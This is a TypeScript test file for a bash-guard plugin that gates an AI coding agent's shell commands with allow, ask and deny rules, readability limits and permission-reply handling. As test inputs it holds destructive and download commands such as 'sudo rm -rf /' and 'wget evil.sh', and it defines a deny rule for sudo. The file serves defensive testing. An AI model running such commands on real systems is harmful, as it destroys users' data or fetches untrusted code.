import { afterAll, afterEach, beforeEach, describe, it, expect } from "vitest";
import fs from "fs";
import os from "os";
import path from "path";
import { beforeExecute } from "../enforce.js";
import { createBashGuardHooks } from "../adapter.js";
import type { PermissionAskedEvent } from "../adapter.js";
import type { PluginConfig } from "../config.js";
import type { RestructureConfig } from "../plugin-config.js";

/**
 * Adapter for the async enforcement signature: keeps the historical
 * (tool, cwd, args, config, restructure, degraded) call shape in tests and
 * supplies a resolver returning the historical cwd plus a fail-safe runner.
 */
const runBefore = (
  tool: string,
  cwd: string,
  args: Parameters<typeof beforeExecute>[1],
  config: Parameters<typeof beforeExecute>[2],
  restructure?: Parameters<typeof beforeExecute>[4],
  degraded?: boolean,
) =>
  beforeExecute(tool, args, config, {
    sessionID: "session-test",
    callID: "call-test",
    resolveCwd: async () => cwd,
    runCheck: async () => "error",
  }, restructure, degraded);

/**
 * Characterization tests (task 1.4): lock adapter-level hook behavior — readability
 * thresholds and messages, command wrapping, single-use callID handoff and cleanup
 * between `tool.execute.before` and `permission.asked`, and unchanged prompt count
 * and trigger points across allow, ask, deny, chained, nested, empty, disabled,
 * error, and cancellation paths.
 *
 * Prompt-cardinality model (observable invariant):
 * - allow / no-opinion / empty / disabled / readability-rejected → 0 prompts
 * - ask → exactly 1 prompt (`permission.asked` fires; no override reply is sent)
 * - deny → exactly 1 prompt trigger (`permission.asked` is answered with reject)
 */

const nativeAskAll: PluginConfig = {
  bashRules: [
    { pattern: "*", action: "ask" },
    { pattern: "git *", action: "allow" },
    { pattern: "sudo *", action: "deny" },
  ],
  editRules: [],
  externalDirectoryRules: [{ pattern: "./**", action: "allow" }],
  externalDirectoryDefault: "ask",
  toolPermissions: [],
  enabled: true,
};

const enabled: RestructureConfig = { enabled: true, maxSegments: 3, maxDepth: 2 };
const disabled: RestructureConfig = { enabled: false, maxSegments: 3, maxDepth: 2 };

type PermissionReply = {
  sessionID: string;
  requestID: string;
  reply: "once" | "reject";
};

type ReplyPermission = (reply: PermissionReply) => Promise<void>;

type SessionIdleEvent = {
  id: string;
  type: "session.idle";
  properties: { sessionID: string };
};

type SessionDeletedEvent = {
  id: string;
  type: "session.deleted";
  properties: {
    sessionID: string;
    info: {
      id: string;
      projectID: string;
      directory: string;
      title: string;
      version: string;
      time: { created: number; updated: number };
    };
  };
};

type BashGuardEvent = PermissionAskedEvent | SessionIdleEvent | SessionDeletedEvent;
type BashGuardHooks = ReturnType<typeof createBashGuardHooks>;
type ToolArguments = { command?: string; args?: { command?: string } };
type ToolInvocation = { tool: string; sessionID: string; callID: string; command?: string; nested?: boolean };

function createReplyCapture(): { replies: PermissionReply[]; replyPermission: ReplyPermission } {
  const replies: PermissionReply[] = [];
  return {
    replies,
    replyPermission: async (reply) => {
      replies.push(reply);
    },
  };
}

async function configureHooks(hooks: BashGuardHooks): Promise<void> {
  if (!hooks.config) throw new Error("config hook is required");
  await hooks.config({ permission: { bash: { "*": "ask", "sudo *": "deny" } } });
}

async function executeBefore(hooks: BashGuardHooks, invocation: ToolInvocation): Promise<ToolArguments> {
  if (!hooks["tool.execute.before"]) throw new Error("tool.execute.before hook is required");
  const args: ToolArguments =
    invocation.command === undefined
      ? {}
      : invocation.nested
        ? { args: { command: invocation.command } }
        : { command: invocation.command };
  const output = { args };
  await hooks["tool.execute.before"](
    { tool: invocation.tool, sessionID: invocation.sessionID, callID: invocation.callID },
    output,
  );
  return output.args;
}

async function executeAfter(hooks: BashGuardHooks, sessionID: string, callID: string): Promise<void> {
  if (!hooks["tool.execute.after"]) throw new Error("tool.execute.after hook is required");
  await hooks["tool.execute.after"](
    { tool: "Bash", sessionID, callID, args: {} },
    { title: "", output: "", metadata: {} },
  );
}

async function emitEvent(hooks: BashGuardHooks, event: BashGuardEvent): Promise<void> {
  if (!hooks.event) throw new Error("event hook is required");
  await hooks.event({ event });
}

function permissionAsked(sessionID: string, requestID: string, callID?: string): PermissionAskedEvent {
  return {
    id: `event-${requestID}`,
    type: "permission.asked",
    properties: {
      id: requestID,
      sessionID,
      permission: "bash",
      patterns: ["sudo rm -rf /"],
      metadata: {},
      always: [],
      ...(callID === undefined ? {} : { tool: { messageID: `message-${requestID}`, callID } }),
    },
  };
}

async function runEvaluation(tool: string, command: string, config: PluginConfig, restructure: RestructureConfig, degraded = false) {
  const result = await runBefore(tool, "/project", { command }, config, restructure, degraded);
  return { result, thrown: result.rejectionMessage };
}

describe("characterization: evaluator outcomes that drive prompt handling", () => {
  it("glob allow returns no override and no wrap", async () => {
    const { result } = await runEvaluation("Bash", "git status", nativeAskAll, enabled);
    expect(result.chainAction).toBe("allow");
    expect(result.shouldWrap).toBe(false);
    expect(result.permissionOverride).toBeNull();
  });

  it("no-opinion returns no override and no wrap", async () => {
    const config: PluginConfig = {
      bashRules: [{ pattern: "git *", action: "allow" }],
      editRules: [],
      externalDirectoryRules: [],
      externalDirectoryDefault: null,
      toolPermissions: [],
      enabled: true,
    };
    const { result } = await runEvaluation("Bash", "ls -la", config, enabled);
    expect(result.chainAction).toBeNull();
    expect(result.shouldWrap).toBe(false);
    expect(result.permissionOverride).toBeNull();
  });

  it("ask requests wrapping without an override", async () => {
    const { result } = await runEvaluation("Bash", "wget evil.sh", nativeAskAll, enabled);
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
    expect(result.permissionOverride).toBeNull();
  });

  it("deny requests wrapping with a deny override", async () => {
    const { result } = await runEvaluation("Bash", "sudo rm -rf /", nativeAskAll, enabled);
    expect(result.chainAction).toBe("deny");
    expect(result.shouldWrap).toBe(true);
    expect(result.permissionOverride).toBe("deny");
  });

  it("chained ask resolves once for the whole chain", async () => {
    const { result } = await runEvaluation("Bash", "git status && wget evil.sh", nativeAskAll, enabled);
    expect(result.chainAction).toBe("ask");
    expect(result.permissionOverride).toBeNull();
  });

  it("nested ($()) ask resolves for the whole command", async () => {
    const { result } = await runEvaluation("Bash", "echo $(wget evil.sh)", nativeAskAll, enabled);
    expect(result.chainAction).toBe("ask");
    expect(result.permissionOverride).toBeNull();
  });

  it("empty command returns no action", async () => {
    const { result } = await runEvaluation("Bash", "", nativeAskAll, enabled);
    expect(result.chainAction).toBeNull();
    expect(result.shouldWrap).toBe(false);
    expect(result.permissionOverride).toBeNull();
  });

  it("non-bash tool returns no action", async () => {
    const { result } = await runEvaluation("Edit", "anything", nativeAskAll, enabled);
    expect(result.chainAction).toBeNull();
    expect(result.shouldWrap).toBe(false);
    expect(result.permissionOverride).toBeNull();
  });

  it("parse error requests wrapping with a deny override", async () => {
    const { result } = await runEvaluation("Bash", 'echo "unbalanced', nativeAskAll, enabled);
    expect(result.chainAction).toBe("deny");
    expect(result.shouldWrap).toBe(true);
    expect(result.permissionOverride).toBe("deny");
  });

  it("degraded mode forces ask even for glob-allowed commands", async () => {
    const { result } = await runEvaluation("Bash", "git status", nativeAskAll, enabled, true);
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
    expect(result.permissionOverride).toBeNull();
  });

  it("args-level allow returns an allow override", async () => {
    const config: PluginConfig = {
      ...nativeAskAll,
      toolPermissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
    };
    const { result } = await runEvaluation("Bash", "curl -X GET https://api.com", config, enabled);
    expect(result.chainAction).toBe("allow");
    expect(result.shouldWrap).toBe(false);
    expect(result.permissionOverride).toBe("allow");
  });
});

describe("characterization: command wrapping", () => {
  it("ask and deny results request wrapping", async () => {
    expect((await runBefore("Bash", "/project", { command: "wget evil.sh" }, nativeAskAll, enabled)).shouldWrap).toBe(true);
    expect((await runBefore("Bash", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled)).shouldWrap).toBe(true);
  });

  it("allow, no-opinion, empty, and readability-rejected results never wrap", async () => {
    expect((await runBefore("Bash", "/project", { command: "git status" }, nativeAskAll, enabled)).shouldWrap).toBe(false);
    expect(
      (await runBefore("Bash", "/project", { command: "ls" }, { bashRules: [], editRules: [], externalDirectoryRules: [], externalDirectoryDefault: null, toolPermissions: [], enabled: true }, enabled))
        .shouldWrap,
    ).toBe(false);
    expect((await runBefore("Bash", "/project", { command: "" }, nativeAskAll, enabled)).shouldWrap).toBe(false);
    const complex = "git status && rm -rf /tmp/x && echo ok && ls";
    expect((await runBefore("Bash", "/project", { command: complex }, nativeAskAll, enabled)).shouldWrap).toBe(false);
  });

  it("tool name matching is case-insensitive; non-bash tools ignored", async () => {
    expect((await runBefore("bash", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled)).chainAction).toBe("deny");
    expect((await runBefore("Bash", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled)).chainAction).toBe("deny");
    expect((await runBefore("Read", "/project", { command: "sudo rm -rf /" }, nativeAskAll, enabled)).chainAction).toBeNull();
  });
});

describe("characterization: readability thresholds and messages", () => {
  it("strictly-greater thresholds: N == max passes, N+1 rejected", async () => {
    expect((await runEvaluation("Bash", "git a && git b && rm -rf /tmp/x", nativeAskAll, enabled)).thrown).toBeNull();
    const over = await runEvaluation("Bash", "git a && git b && git c && rm -rf /tmp/x", nativeAskAll, enabled);
    expect(over.thrown).not.toBeNull();
    expect(over.thrown).toContain("4 chained commands");
    expect(over.thrown).toContain("nesting depth 1");
    expect(over.thrown).toContain("Re-issue as separate bash tool calls");
  });

  it("rejection fires only on ask; deny and allow flows unchanged", async () => {
    const denyConfig: PluginConfig = {
      ...nativeAskAll,
      bashRules: [
        { pattern: "*", action: "ask" },
        { pattern: "git *", action: "allow" },
        { pattern: "git push *", action: "deny" },
      ],
    };
    const denyCmd = "git push --force && git status && git log && git show";
    const denyResult = await runBefore("Bash", "/project", { command: denyCmd }, denyConfig, enabled);
    expect(denyResult.rejectionMessage).toBeNull();
    expect(denyResult.chainAction).toBe("deny");

    const allowCmd = "git status && git log && git diff && git show";
    const allowResult = await runBefore("Bash", "/project", { command: allowCmd }, nativeAskAll, enabled);
    expect(allowResult.rejectionMessage).toBeNull();
    expect(allowResult.chainAction).toBe("allow");
  });

  it("no-opinion chains are never rejected", async () => {
    const config: PluginConfig = {
      bashRules: [],
      editRules: [],
      externalDirectoryRules: [],
      externalDirectoryDefault: null,
      toolPermissions: [],
      enabled: true,
    };
    const result = await runBefore("Bash", "/project", { command: "a && b && c && d" }, config, enabled);
    expect(result.rejectionMessage).toBeNull();
    expect(result.chainAction).toBeNull();
  });

  it("parse errors fail closed before readability runs", async () => {
    const result = await runBefore("Bash", "/project", { command: 'echo "unbalanced' }, nativeAskAll, enabled);
    expect(result.chainAction).toBe("deny");
    expect(result.rejectionMessage).toBeNull();
  });

  it("multi-line: per-line limit names the worst line", async () => {
    const cmd = "git a && git b && git c && git d && rm -rf /tmp/x\ngit e && git f";
    const { result } = await runEvaluation("Bash", cmd, nativeAskAll, enabled);
    expect(result.rejectionMessage).toContain("Complex command rejected (line 1: 5 chained commands");
  });

  it("multi-line one-command-per-line re-issue passes the gate", async () => {
    const cmd = "git status\nrm -rf /tmp/x\necho ok\nls";
    const { result, thrown } = await runEvaluation("Bash", cmd, nativeAskAll, enabled);
    expect(thrown).toBeNull();
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
  });

  it("depth threshold: single $() passes, double $() rejected", async () => {
    expect((await runEvaluation("Bash", "echo $(whoami)", nativeAskAll, enabled)).thrown).toBeNull();
    const over = await runEvaluation("Bash", "echo $(echo $(whoami))", nativeAskAll, enabled);
    expect(over.thrown).toContain("nesting depth 3");
  });

  it("inline-script statement count over threshold rejected with interpreter name", async () => {
    const cmd = `git status && python3 -c "import os; os.system('a'); os.system('b'); os.system('c'); os.system('d')"`;
    const { result, thrown } = await runEvaluation("Bash", cmd, nativeAskAll, enabled);
    expect(thrown).toContain("Complex inline script rejected (python -c: 5 statements)");
    expect(result.shouldWrap).toBe(false);
  });

  it("feature disabled — complex ask chain follows the plain ask flow", async () => {
    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
    const { result, thrown } = await runEvaluation("Bash", cmd, nativeAskAll, disabled);
    expect(thrown).toBeNull();
    expect(result.chainAction).toBe("ask");
    expect(result.shouldWrap).toBe(true);
  });

  it("repeated violation re-throws with the same message (no retry counter)", async () => {
    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
    const first = await runEvaluation("Bash", cmd, nativeAskAll, enabled);
    const second = await runEvaluation("Bash", cmd, nativeAskAll, enabled);
    expect(second.thrown).toBe(first.thrown);
  });

  it("rejected ask chain returns no override (no dialog follows the throw)", async () => {
    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
    const { result } = await runEvaluation("Bash", cmd, nativeAskAll, enabled);
    expect(result.permissionOverride).toBeNull();
  });
});

describe("characterization: permission.asked lifecycle", () => {
  let project: string;
  let xdgConfigHome: string;
  let previousXdgConfigHome: string | undefined;

  beforeEach(() => {
    project = fs.mkdtempSync(path.join(os.tmpdir(), "obg-lifecycle-project-"));
    xdgConfigHome = fs.mkdtempSync(path.join(os.tmpdir(), "obg-lifecycle-xdg-"));
    previousXdgConfigHome = process.env.XDG_CONFIG_HOME;
    process.env.XDG_CONFIG_HOME = xdgConfigHome;
  });

  afterEach(() => {
    if (previousXdgConfigHome === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = previousXdgConfigHome;
    fs.rmSync(project, { recursive: true, force: true });
    fs.rmSync(xdgConfigHome, { recursive: true, force: true });
  });

  it("maps an args-level allow decision to a once reply", async () => {
    fs.mkdirSync(path.join(project, ".opencode"), { recursive: true });
    fs.writeFileSync(
      path.join(project, ".opencode", "opencode-bash-guard.jsonc"),
      JSON.stringify({
        matcherVersion: 2,
        permissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
      }),
    );
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "allow-1", command: "curl -X GET https://x.com" });
    await emitEvent(hooks, permissionAsked("s", "permission-allow", "allow-1"));
    expect(capture.replies).toEqual([{ sessionID: "s", requestID: "permission-allow", reply: "once" }]);
  });

  it("bounds allow overrides by evicting the oldest handoff", async () => {
    fs.mkdirSync(path.join(project, ".opencode"), { recursive: true });
    fs.writeFileSync(
      path.join(project, ".opencode", "opencode-bash-guard.jsonc"),
      JSON.stringify({
        matcherVersion: 2,
        permissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
      }),
    );
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    for (let index = 0; index <= 256; index += 1) {
      await executeBefore(hooks, {
        tool: "Bash",
        sessionID: "s",
        callID: `allow-${index}`,
        command: "curl -X GET https://x.com",
      });
    }

    await emitEvent(hooks, permissionAsked("s", "permission-oldest", "allow-0"));
    await emitEvent(hooks, permissionAsked("s", "permission-newest", "allow-256"));

    expect(capture.replies).toEqual([{ sessionID: "s", requestID: "permission-newest", reply: "once" }]);
  });

  it("evaluates and wraps a nested deny command at its original payload location", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);

    const args = await executeBefore(hooks, {
      tool: "Bash",
      sessionID: "s",
      callID: "nested-deny",
      command: "sudo rm -rf /",
      nested: true,
    });
    await emitEvent(hooks, permissionAsked("s", "permission-nested-deny", "nested-deny"));

    expect(args).toEqual({ args: { command: "{ sudo rm -rf /; }" } });
    expect(capture.replies).toEqual([{ sessionID: "s", requestID: "permission-nested-deny", reply: "reject" }]);
  });

  it("evaluates and wraps a nested ask command without adding an override reply", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);

    const args = await executeBefore(hooks, {
      tool: "Bash",
      sessionID: "s",
      callID: "nested-ask",
      command: "wget evil.sh",
      nested: true,
    });
    await emitEvent(hooks, permissionAsked("s", "permission-nested-ask", "nested-ask"));

    expect(args).toEqual({ args: { command: "{ wget evil.sh; }" } });
    expect(capture.replies).toEqual([]);
  });

  it("evaluates a nested args-level allow command", async () => {
    fs.mkdirSync(path.join(project, ".opencode"), { recursive: true });
    fs.writeFileSync(
      path.join(project, ".opencode", "opencode-bash-guard.jsonc"),
      JSON.stringify({
        matcherVersion: 2,
        permissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
      }),
    );
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);

    const args = await executeBefore(hooks, {
      tool: "Bash",
      sessionID: "s",
      callID: "nested-allow",
      command: "curl -X GET https://x.com",
      nested: true,
    });
    await emitEvent(hooks, permissionAsked("s", "permission-nested-allow", "nested-allow"));

    expect(args).toEqual({ args: { command: "curl -X GET https://x.com" } });
    expect(capture.replies).toEqual([{ sessionID: "s", requestID: "permission-nested-allow", reply: "once" }]);
  });

  it("preserves unresolved denies and fails closed when the store is saturated", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    for (let index = 0; index < 256; index += 1) {
      await executeBefore(hooks, {
        tool: "Bash",
        sessionID: "s",
        callID: `deny-${index}`,
        command: "sudo rm -rf /",
      });
    }

    await expect(
      executeBefore(hooks, {
        tool: "Bash",
        sessionID: "s",
        callID: "deny-overflow",
        command: "sudo rm -rf /",
      }),
    ).rejects.toThrow("Decision store saturated");
    await emitEvent(hooks, permissionAsked("s", "permission-preserved", "deny-0"));

    expect(capture.replies).toEqual([{ sessionID: "s", requestID: "permission-preserved", reply: "reject" }]);
  });

  it("maps a deny decision to reject and consumes it after one reply", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "deny-once", command: "sudo rm -rf /" });

    await emitEvent(hooks, permissionAsked("s", "permission-first", "deny-once"));
    await emitEvent(hooks, permissionAsked("s", "permission-second", "deny-once"));

    expect(capture.replies).toEqual([{ sessionID: "s", requestID: "permission-first", reply: "reject" }]);
  });

  it("restores a consumed decision when the permission reply rejects", async () => {
    const replies: PermissionReply[] = [];
    let attempts = 0;
    const hooks = createBashGuardHooks({ directory: project }, async (reply: PermissionReply) => {
      attempts += 1;
      replies.push(reply);
      if (attempts === 1) throw new Error("reply failed");
    }, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "retryable", command: "sudo rm -rf /" });

    await expect(emitEvent(hooks, permissionAsked("s", "permission-first", "retryable"))).rejects.toThrow("reply failed");
    await emitEvent(hooks, permissionAsked("s", "permission-second", "retryable"));

    expect(replies).toEqual([
      { sessionID: "s", requestID: "permission-first", reply: "reject" },
      { sessionID: "s", requestID: "permission-second", reply: "reject" },
    ]);
  });

  it("does not double-reply when the same permission event is delivered concurrently", async () => {
    let releaseReply = (): void => {};
    const replyGate = new Promise<void>((resolve) => {
      releaseReply = resolve;
    });
    const replies: PermissionReply[] = [];
    const hooks = createBashGuardHooks({ directory: project }, async (reply: PermissionReply) => {
      replies.push(reply);
      await replyGate;
    }, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "concurrent", command: "sudo rm -rf /" });
    const event = permissionAsked("s", "permission-concurrent", "concurrent");

    const firstDelivery = emitEvent(hooks, event);
    await emitEvent(hooks, event);
    releaseReply();
    await firstDelivery;

    expect(replies).toEqual([{ sessionID: "s", requestID: "permission-concurrent", reply: "reject" }]);
  });

  it("does not overwrite a newer same-key decision when an older reply rejects", async () => {
    fs.mkdirSync(path.join(project, ".opencode"), { recursive: true });
    fs.writeFileSync(
      path.join(project, ".opencode", "opencode-bash-guard.jsonc"),
      JSON.stringify({
        matcherVersion: 2,
        permissions: [{ tool: "curl", args: [{ token: "-X", pattern: "GET", action: "allow" }], flags: { "-X": 1 } }],
      }),
    );
    let releaseReply = (): void => {};
    const replyGate = new Promise<void>((resolve) => {
      releaseReply = resolve;
    });
    const replies: PermissionReply[] = [];
    let attempts = 0;
    const hooks = createBashGuardHooks({ directory: project }, async (reply: PermissionReply) => {
      attempts += 1;
      replies.push(reply);
      if (attempts === 1) {
        await replyGate;
        throw new Error("older reply failed");
      }
    }, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "reused-in-flight", command: "sudo rm -rf /" });
    const olderReply = emitEvent(hooks, permissionAsked("s", "permission-old", "reused-in-flight"));
    await executeBefore(hooks, {
      tool: "Bash",
      sessionID: "s",
      callID: "reused-in-flight",
      command: "curl -X GET https://x.com",
    });

    releaseReply();
    await expect(olderReply).rejects.toThrow("older reply failed");
    await emitEvent(hooks, permissionAsked("s", "permission-new", "reused-in-flight"));

    expect(replies).toEqual([
      { sessionID: "s", requestID: "permission-old", reply: "reject" },
      { sessionID: "s", requestID: "permission-new", reply: "once" },
    ]);
  });

  it("does not reply when permission.asked has no tool callID or an unknown callID", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);

    await emitEvent(hooks, permissionAsked("s", "permission-missing"));
    await emitEvent(hooks, permissionAsked("s", "permission-unknown", "never-stored"));

    expect(capture.replies).toEqual([]);
  });

  it("does not consume a bash decision for a different permission type", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "typed", command: "sudo rm -rf /" });
    const wrongPermission = permissionAsked("s", "permission-edit", "typed");

    await emitEvent(hooks, {
      ...wrongPermission,
      properties: { ...wrongPermission.properties, permission: "edit" },
    });
    await emitEvent(hooks, permissionAsked("s", "permission-bash", "typed"));

    expect(capture.replies).toEqual([{ sessionID: "s", requestID: "permission-bash", reply: "reject" }]);
  });

  it("leaves native ask decisions unanswered", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "native-ask", command: "wget evil.sh" });

    await emitEvent(hooks, permissionAsked("s", "permission-native", "native-ask"));
    await executeAfter(hooks, "s", "native-ask");

    expect(capture.replies).toEqual([]);
  });

  it("keeps equal callIDs isolated by session", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-a", callID: "shared", command: "sudo rm -rf /" });
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-b", callID: "shared", command: "sudo rm -rf /" });

    await emitEvent(hooks, permissionAsked("session-a", "permission-a", "shared"));
    await emitEvent(hooks, permissionAsked("session-b", "permission-b", "shared"));

    expect(capture.replies).toEqual([
      { sessionID: "session-a", requestID: "permission-a", reply: "reject" },
      { sessionID: "session-b", requestID: "permission-b", reply: "reject" },
    ]);
  });

  it("keeps decision stores isolated between hook instances", async () => {
    const firstCapture = createReplyCapture();
    const secondCapture = createReplyCapture();
    const firstHooks = createBashGuardHooks({ directory: project }, firstCapture.replyPermission, async () => project);
    const secondHooks = createBashGuardHooks({ directory: project }, secondCapture.replyPermission, async () => project);
    await configureHooks(firstHooks);
    await configureHooks(secondHooks);
    await executeBefore(firstHooks, { tool: "Bash", sessionID: "s", callID: "instance-call", command: "sudo rm -rf /" });

    await emitEvent(secondHooks, permissionAsked("s", "permission-second-instance", "instance-call"));
    await emitEvent(firstHooks, permissionAsked("s", "permission-first-instance", "instance-call"));

    expect(secondCapture.replies).toEqual([]);
    expect(firstCapture.replies).toEqual([{ sessionID: "s", requestID: "permission-first-instance", reply: "reject" }]);
  });

  it("tool.execute.after clears an unconsumed decision", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "after-call", command: "sudo rm -rf /" });

    await executeAfter(hooks, "s", "after-call");
    await emitEvent(hooks, permissionAsked("s", "permission-after", "after-call"));

    expect(capture.replies).toEqual([]);
  });

  it("a reused callID on a non-storing path clears stale residue", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "reused", command: "sudo rm -rf /" });
    await executeBefore(hooks, { tool: "Bash", sessionID: "s", callID: "reused", command: "" });

    await emitEvent(hooks, permissionAsked("s", "permission-reused", "reused"));

    expect(capture.replies).toEqual([]);
  });

  it("non-bash and disabled paths create no replyable decision", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Edit", sessionID: "s", callID: "edit-call" });
    await emitEvent(hooks, permissionAsked("s", "permission-edit", "edit-call"));

    const disabledCapture = createReplyCapture();
    const disabledHooks = createBashGuardHooks({ directory: project }, disabledCapture.replyPermission, async () => project);
    if (!disabledHooks.config) throw new Error("config hook is required");
    await disabledHooks.config({ permission: { bash: "allow" } });
    await executeBefore(disabledHooks, { tool: "Bash", sessionID: "s", callID: "disabled-call", command: "sudo rm -rf /" });
    await emitEvent(disabledHooks, permissionAsked("s", "permission-disabled", "disabled-call"));

    expect(capture.replies).toEqual([]);
    expect(disabledCapture.replies).toEqual([]);
  });

  it("session.idle clears only that session's decisions", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-a", callID: "idle-call", command: "sudo rm -rf /" });
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-b", callID: "idle-call", command: "sudo rm -rf /" });

    await emitEvent(hooks, { id: "event-idle", type: "session.idle", properties: { sessionID: "session-a" } });
    await emitEvent(hooks, permissionAsked("session-a", "permission-idle-a", "idle-call"));
    await emitEvent(hooks, permissionAsked("session-b", "permission-idle-b", "idle-call"));

    expect(capture.replies).toEqual([{ sessionID: "session-b", requestID: "permission-idle-b", reply: "reject" }]);
  });

  it("session.deleted clears only the deleted session's decisions", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-a", callID: "deleted-call", command: "sudo rm -rf /" });
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-b", callID: "deleted-call", command: "sudo rm -rf /" });

    await emitEvent(hooks, {
      id: "event-deleted",
      type: "session.deleted",
      properties: {
        sessionID: "session-a",
        info: {
          id: "session-a",
          projectID: "project",
          directory: "/project",
          title: "deleted session",
          version: "1",
          time: { created: 1, updated: 2 },
        },
      },
    });
    await emitEvent(hooks, permissionAsked("session-a", "permission-deleted-a", "deleted-call"));
    await emitEvent(hooks, permissionAsked("session-b", "permission-deleted-b", "deleted-call"));

    expect(capture.replies).toEqual([{ sessionID: "session-b", requestID: "permission-deleted-b", reply: "reject" }]);
  });

  it("dispose clears every remaining decision", async () => {
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: project }, capture.replyPermission, async () => project);
    await configureHooks(hooks);
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-a", callID: "dispose-a", command: "sudo rm -rf /" });
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-b", callID: "dispose-b", command: "sudo rm -rf /" });
    if (!hooks.dispose) throw new Error("dispose hook is required");

    await hooks.dispose();
    await emitEvent(hooks, permissionAsked("session-a", "permission-dispose-a", "dispose-a"));
    await emitEvent(hooks, permissionAsked("session-b", "permission-dispose-b", "dispose-b"));

    expect(capture.replies).toEqual([]);
  });
});

describe("characterization: runtime directory resolution with selected checks", () => {
  interface ResolverCall {
    sessionID: string;
    directory: string | undefined;
  }

  const checkerDirs: string[] = [];
  afterAll(() => {
    for (const dir of checkerDirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
  });

  function makeCheckProject(): { projectDir: string; checkerCjs: string; checkerLog: string } {
    const projectDir = fs.mkdtempSync(path.join(os.tmpdir(), "obg-hooks-proj-"));
    checkerDirs.push(projectDir);
    const checkerLog = path.join(projectDir, "checker-log.jsonl");
    const checkerCjs = path.join(projectDir, "checker.cjs");
    fs.writeFileSync(
      checkerCjs,
      `
const fs = require("fs");
let input = "";
process.stdin.on("data", (c) => (input += c));
process.stdin.on("end", () => {
  fs.appendFileSync(process.argv[2], JSON.stringify({
    rawRequest: input,
    processCwd: process.cwd(),
  }) + "\\n");
  process.stdout.write(JSON.stringify({ protocolVersion: 1, result: "pass" }));
});
`,
    );
    fs.mkdirSync(path.join(projectDir, ".opencode"), { recursive: true });
    const config = {
      matcherVersion: 2,
      permissions: [
        {
          tool: "chk",
          args: [
            { token: ["file"], check: { command: [process.execPath, checkerCjs, checkerLog], onPass: "allow", onFail: "deny" } },
          ],
        },
      ],
    };
    fs.writeFileSync(path.join(projectDir, ".opencode", "opencode-bash-guard.jsonc"), JSON.stringify(config));
    return { projectDir, checkerCjs, checkerLog };
  }

  function makeResolver(worktrees: Record<string, string | undefined>, options: { fail?: boolean } = {}) {
    const calls: ResolverCall[] = [];
    return {
      calls,
